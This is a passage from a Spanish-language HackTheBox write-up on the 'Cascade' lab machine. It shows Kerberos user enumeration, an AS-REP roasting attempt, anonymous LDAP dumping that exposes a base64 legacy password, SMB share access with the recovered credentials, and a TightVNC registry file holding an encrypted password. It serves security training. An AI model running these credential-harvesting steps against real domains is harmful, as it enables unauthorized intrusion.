2024/05/30 10:58:12 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/05/30 10:58:12 <span class="o">&gt;</span>  	cascade.local:88

2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 s.hickson@cascade.local
2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 j.goodhand@cascade.local
2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 j.wakefield@cascade.local
2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 s.smith@cascade.local
2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 a.turnbull@cascade.local
2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 r.thompson@cascade.local
2024/05/30 10:58:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 util@cascade.local
2024/05/30 10:58:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 arksvc@cascade.local
2024/05/30 10:58:22 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 d.burman@cascade.local
2024/05/30 10:58:22 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 j.allen@cascade.local
2024/05/30 10:58:22 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 BackupSvc@cascade.local
2024/05/30 10:58:22 <span class="o">&gt;</span>  Done! Tested 15 usernames <span class="o">(</span>11 valid<span class="o">)</span> <span class="k">in </span>10.383 seconds
</code></pre></div></div>

<ul>
  <li>Vamos a tratar de obtener un <code class="language-plaintext highlighter-rouge">TGT</code> sin uso de una contraseña por que no disponemos de ninguna pero si probamos con este ataque no tenemos suerte.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap impacket-GetNPUsers <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt cascade.local/
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
<span class="o">[</span>-] User arksvc doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User r.thompson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User j.wakefield doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User j.goodhand doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
<span class="o">[</span>-] User d.burman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User j.allen doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
</span></code></pre></div></div>

<ul>
  <li>
    <p>Tenemos el puerto <code class="language-plaintext highlighter-rouge">ldap</code> abierto así que también podemos enumerar por ese protocolo <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</a>.</p>
  </li>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">ldapsearch</code> para enumerar este servicio algo que podemos hacer es ver los usuarios si es que no nos pide credenciales.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s2">"dc=cascade,dc=local"</span> | <span class="nb">grep</span> <span class="s1">'userPrincipalName'</span> | <span class="nb">tr</span> <span class="s1">'@'</span> <span class="s1">' '</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span>
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
</code></pre></div></div>

<ul>
  <li>Pero bueno como ya hicimos pruebas con los usuarios de solicitar un <code class="language-plaintext highlighter-rouge">TGT</code> vamos mejor seguir enumerando filtrando por el <code class="language-plaintext highlighter-rouge">Distinguished Name</code> y aquellas líneas que contienen la palabra <code class="language-plaintext highlighter-rouge">users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s2">"dc=cascade,dc=local"</span> | <span class="nb">grep</span> <span class="s1">'dn'</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s1">'users'</span>
dn: <span class="nv">CN</span><span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>CascGuest,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Remote Desktop Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Performance Monitor Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Performance Log Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Distributed COM Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>krbtgt,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Domain Computers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Domain Controllers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Schema Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Enterprise Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Cert Publishers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Domain Users,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Domain Guests,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>RAS and IAS Servers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Allowed RODC Password Replication Group,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Denied RODC Password Replication Group,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Read-only Domain Controllers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Enterprise Read-only Domain Controllers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>DnsAdmins,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>DnsUpdateProxy,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">OU</span><span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>ArkSvc,OU<span class="o">=</span>Services,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Steve Smith,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Ryan Thompson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Util,OU<span class="o">=</span>Services,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>James Wakefield,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Stephanie Hickson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>John Goodhand,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Adrian Turnbull,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>WinRMRemoteWMIUsers__,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Remote Management Users,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Edward Crowe,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Ben Hanson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>David Burman,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">OU</span><span class="o">=</span>Services,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>BackupSvc,OU<span class="o">=</span>Services,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Joseph Allen,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Ian Croft,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</code></pre></div></div>

<ul>
  <li>Vemos usuarios importantes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s2">"ou=Users,ou=UK,dc=cascade,dc=local"</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s1">'#\|memberof'</span>
<span class="c"># extended LDIF</span>
<span class="c">#</span>
<span class="c"># LDAPv3</span>
<span class="c"># base &lt;ou=Users,ou=UK,dc=cascade,dc=local&gt; with scope subtree</span>
<span class="c"># filter: (objectclass=*)</span>
<span class="c"># requesting: ALL</span>
<span class="c">#</span>
<span class="c"># Users, UK, cascade.local</span>
<span class="c"># Steve Smith, Users, UK, cascade.local</span>
memberOf: <span class="nv">CN</span><span class="o">=</span>Audit Share,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>memberOf: <span class="nv">CN</span><span class="o">=</span>Remote Management Users,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
<span class="c"># Ryan Thompson, Users, UK, cascade.local</span>
memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
<span class="c"># James Wakefield, Users, UK, cascade.local</span>
<span class="c"># Stephanie Hickson, Users, UK, cascade.local</span>
memberOf: <span class="nv">CN</span><span class="o">=</span>HR,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
<span class="c"># John Goodhand, Users, UK, cascade.local</span>
<span class="c"># Adrian Turnbull, Users, UK, cascade.local</span>
<span class="c"># Edward Crowe, Users, UK, cascade.local</span>
<span class="c"># Ben Hanson, Users, UK, cascade.local</span>
<span class="c"># David Burman, Users, UK, cascade.local</span>
<span class="c"># Services, Users, UK, cascade.local</span>
<span class="c"># ArkSvc, Services, Users, UK, cascade.local</span>
memberOf: <span class="nv">CN</span><span class="o">=</span>Remote Management Users,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>memberOf: <span class="nv">CN</span><span class="o">=</span>AD Recycle Bin,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
<span class="c"># Util, Services, Users, UK, cascade.local</span>
<span class="c"># BackupSvc, Services, Users, UK, cascade.local</span>
<span class="c"># Joseph Allen, Users, UK, cascade.local</span>
<span class="c"># Ian Croft, Users, UK, cascade.local</span>
<span class="c"># search result</span>
<span class="c"># numResponses: 17</span>
<span class="c"># numEntries: 16</span>
</code></pre></div></div>

<ul>
  <li>Si vemos información del usuario podemos ver información como una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s2">"ou=Users,ou=UK,dc=cascade,dc=local"</span> | <span class="nb">grep</span> <span class="nt">-A</span> 50 <span class="nt">-i</span> <span class="s2">"# Ryan Thompson"</span>

<span class="c"># Ryan Thompson, Users, UK, cascade.local</span>
dn: <span class="nv">CN</span><span class="o">=</span>Ryan Thompson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: <span class="nv">CN</span><span class="o">=</span>Ryan Thompson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>uSNChanged: 295010
name: Ryan Thompson
objectGUID:: <span class="nv">LfpD6qngUkupEy9bFXBBjA</span><span class="o">==</span>
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: <span class="nv">AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA</span><span class="o">==</span>
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: <span class="nv">clk0bjVldmE</span><span class="o">=</span>

<span class="c"># James Wakefield, Users, UK, cascade.local</span>
dn: <span class="nv">CN</span><span class="o">=</span>James Wakefield,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: James Wakefield
</code></pre></div></div>

<ul>
  <li>Al parecer es <code class="language-plaintext highlighter-rouge">base64</code> y podemos convertirla a texto plano.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo </span><span class="nv">clk0bjVldmE</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span>
rY4n5eva
</code></pre></div></div>

<h2 id="shell-as-ssmith">Shell as s.smith</h2>

<ul>
  <li>Verificamos que las credenciales sean correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.10.182 <span class="nt">-u</span> <span class="s2">"r.thompson"</span> <span class="nt">-p</span> <span class="s2">"rY4n5eva"</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\r</span>.thompson:rY4n5eva
</code></pre></div></div>

<ul>
  <li>Vamos a ver los recursos compartidos por el método <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.10.182 <span class="nt">-u</span> <span class="s2">"r.thompson"</span> <span class="nt">-p</span> <span class="s2">"rY4n5eva"</span> <span class="nt">--shares</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\r</span>.thompson:rY4n5eva
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.182    445    CASC-DC1         ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit<span class="err">$</span>
SMB         10.10.10.182    445    CASC-DC1         C<span class="nv">$ </span>                             Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ
SMB         10.10.10.182    445    CASC-DC1         IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.10.10.182    445    CASC-DC1         print<span class="nv">$ </span>         READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Tenemos capacidad de lectura en un recurso importante que se llama <code class="language-plaintext highlighter-rouge">Data</code> vamos a ver que es lo que hay.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient //10.10.10.182/data <span class="nt">-U</span> r.thompson%rY4n5eva
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Sun Jan 26 21:27:34 2020
  ..                                  D        0  Sun Jan 26 21:27:34 2020
  Contractors                         D        0  Sun Jan 12 19:45:11 2020
  Finance                             D        0  Sun Jan 12 19:45:06 2020
  IT                                  D        0  Tue Jan 28 12:04:51 2020
  Production                          D        0  Sun Jan 12 19:45:18 2020
  Temps                               D        0  Sun Jan 12 19:45:15 2020

		6553343 blocks of size 4096. 1625340 blocks available
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Encontramos información interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\I</span>T<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Tue Jan 28 12:04:51 2020
  ..                                  D        0  Tue Jan 28 12:04:51 2020
  Email Archives                      D        0  Tue Jan 28 12:00:30 2020
  LogonAudit                          D        0  Tue Jan 28 12:04:40 2020
  Logs                                D        0  Tue Jan 28 18:53:04 2020
  Temp                                D        0  Tue Jan 28 16:06:59 2020

		6553343 blocks of size 4096. 1625081 blocks available
smb: <span class="se">\I</span>T<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a descargarnos lo que hay.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\I</span>T<span class="se">\&gt;</span> recurse ON
smb: <span class="se">\I</span>T<span class="se">\&gt;</span> prompt OFF
smb: <span class="se">\I</span>T<span class="se">\&gt;</span> mget <span class="k">*</span>
getting file <span class="se">\I</span>T<span class="se">\E</span>mail Archives<span class="se">\M</span>eeting_Notes_June_2018.html of size 2522 as Email Archives/Meeting_Notes_June_2018.html <span class="o">(</span>7.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 7.1 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\I</span>T<span class="se">\L</span>ogs<span class="se">\A</span>rk AD Recycle Bin<span class="se">\A</span>rkAdRecycleBin.log of size 1303 as Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log <span class="o">(</span>3.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 5.4 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\I</span>T<span class="se">\L</span>ogs<span class="se">\D</span>Cs<span class="se">\d</span>cdiag.log of size 5967 as Logs/DCs/dcdiag.log <span class="o">(</span>17.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 9.3 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\I</span>T<span class="se">\T</span>emp<span class="se">\s</span>.smith<span class="se">\V</span>NC Install.reg of size 2680 as Temp/s.smith/VNC Install.reg <span class="o">(</span>7.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 8.9 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Podemos ver un al parecer notas de una Reunión pero esta en <code class="language-plaintext highlighter-rouge">html</code> vamos a verla desde el navegador.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/1.png" />
</p>

<ul>
  <li>
    <p>Nos dan esta información <strong>Username is TempAdmin (password is the same as the normal admin account password)</strong>.</p>
  </li>
  <li>
    <p>En la ruta <code class="language-plaintext highlighter-rouge">/Temp/s.smith</code> vemos un archivo <code class="language-plaintext highlighter-rouge">.reg</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith <span class="nb">cat </span>VNC<span class="se">\ </span>Install.reg
Windows Registry Editor Version 5.00

<span class="o">[</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\T</span>ightVNC]

<span class="o">[</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\T</span>ightVNC<span class="se">\S</span>erver]
<span class="s2">"ExtraPorts"</span><span class="o">=</span><span class="s2">""</span>
<span class="s2">"QueryTimeout"</span><span class="o">=</span>dword:0000001e
<span class="s2">"QueryAcceptOnTimeout"</span><span class="o">=</span>dword:00000000
<span class="s2">"LocalInputPriorityTimeout"</span><span class="o">=</span>dword:00000003
<span class="s2">"LocalInputPriority"</span><span class="o">=</span>dword:00000000
<span class="s2">"BlockRemoteInput"</span><span class="o">=</span>dword:00000000
<span class="s2">"BlockLocalInput"</span><span class="o">=</span>dword:00000000
<span class="s2">"IpAccessControl"</span><span class="o">=</span><span class="s2">""</span>
<span class="s2">"RfbPort"</span><span class="o">=</span>dword:0000170c
<span class="s2">"HttpPort"</span><span class="o">=</span>dword:000016a8
<span class="s2">"DisconnectAction"</span><span class="o">=</span>dword:00000000
<span class="s2">"AcceptRfbConnections"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseVncAuthentication"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseControlAuthentication"</span><span class="o">=</span>dword:00000000
<span class="s2">"RepeatControlAuthentication"</span><span class="o">=</span>dword:00000000
<span class="s2">"LoopbackOnly"</span><span class="o">=</span>dword:00000000
<span class="s2">"AcceptHttpConnections"</span><span class="o">=</span>dword:00000001
<span class="s2">"LogLevel"</span><span class="o">=</span>dword:00000000
<span class="s2">"EnableFileTransfers"</span><span class="o">=</span>dword:00000001
<span class="s2">"RemoveWallpaper"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseD3D"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseMirrorDriver"</span><span class="o">=</span>dword:00000001
<span class="s2">"EnableUrlParams"</span><span class="o">=</span>dword:00000001
<span class="s2">"Password"</span><span class="o">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
<span class="s2">"AlwaysShared"</span><span class="o">=</span>dword:00000000
<span class="s2">"NeverShared"</span><span class="o">=</span>dword:00000000
<span class="s2">"DisconnectClients"</span><span class="o">=</span>dword:00000001
<span class="s2">"PollingInterval"</span><span class="o">=</span>dword:000003e8
<span class="s2">"AllowLoopback"</span><span class="o">=</span>dword:00000000
<span class="s2">"VideoRecognitionInterval"</span><span class="o">=</span>dword:00000bb8
<span class="s2">"GrabTransparentWindows"</span><span class="o">=</span>dword:00000001
<span class="s2">"SaveLogToAllUsersPath"</span><span class="o">=</span>dword:00000000
<span class="s2">"RunControlInterface"</span><span class="o">=</span>dword:00000001
<span class="s2">"IdleTimeout"</span><span class="o">=</span>dword:00000000
<span class="s2">"VideoClasses"</span><span class="o">=</span><span class="s2">""</span>
